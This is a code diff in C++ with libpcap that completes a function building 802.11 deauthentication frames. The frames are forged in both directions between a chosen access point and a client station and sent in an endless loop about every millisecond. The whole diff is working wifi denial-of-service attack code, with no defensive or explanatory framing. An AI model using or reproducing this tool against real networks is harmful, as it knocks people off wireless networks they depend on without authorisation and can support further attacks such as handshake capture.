@@ -31,9 +31,37 @@ void SendBroadcastDeauth(pcap_t* handle, Mac apMac) {
 }
 
 void SendUnicastDeauth(pcap_t* handle, Mac apMac, Mac stationMac) {
-        // make packet
-	while (true) {
-                // send packet
+	int res;
+
+        DeauthAttackPacket apPkt, stPkt;
+
+        memset(&apPkt, 0x00, sizeof(DeauthAttackPacket));
+	memset(&stPkt, 0x00, sizeof(DeauthAttackPacket));
+        apPkt.rtab[2] = 0x08;
+        stPkt.rtab[2] = 0x08;
+	apPkt.type = DEAUTH_TYPE;
+	stPkt.type = DEAUTH_TYPE;
+	apPkt.man[0] = 0x07;
+	stPkt.man[0] = 0x07;
+	
+        memcpy(&apPkt.rcv, (uint8_t*)stationMac, sizeof(Mac));
+	memcpy(&apPkt.trs, (uint8_t*)apMac, sizeof(Mac));
+
+        memcpy(&stPkt.rcv, (uint8_t*)apMac, sizeof(Mac));
+	memcpy(&stPkt.trs, (uint8_t*)stationMac, sizeof(Mac));
+
+	memcpy(&apPkt.bssid, (uint8_t*)apMac, sizeof(Mac));
+	memcpy(&stPkt.bssid, (uint8_t*)apMac, sizeof(Mac));
+
+        while (true) {
+                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&apPkt), sizeof(DeauthAttackPacket));
+                if (0 != res) printf("Fail to send packet | res=%d | error=%s\n", res, pcap_geterr(handle));
+                else printf("apPkt sent!\n");
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&stPkt), sizeof(DeauthAttackPacket));
+                if (0 != res) printf("Fail to send packet | res=%d | error=%s\n", res, pcap_geterr(handle));
+                else printf("stPkt sent!\n");
+
+                usleep(999);
         }
 }
 
